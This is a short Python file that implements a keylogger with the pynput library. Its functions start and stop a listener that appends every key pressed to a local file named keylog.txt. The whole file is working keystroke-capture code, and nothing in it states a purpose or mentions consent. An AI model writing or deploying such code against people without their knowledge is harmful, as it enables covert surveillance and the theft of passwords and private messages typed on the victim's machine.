from pynput.keyboard import Key, Listener
import os

keylogger_listener = None

# Function to handle each key press event
def on_press(key):
    with open("keylog.txt", "a") as log:
        log.write(str(key) + '\n')

# Function to start the keylogger
def start_keylogger():
    global keylogger_listener
    keylogger_listener = Listener(on_press=on_press)
    keylogger_listener.start()

# Function to stop the keylogger
def stop_keylogger():
    global keylogger_listener
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener = None
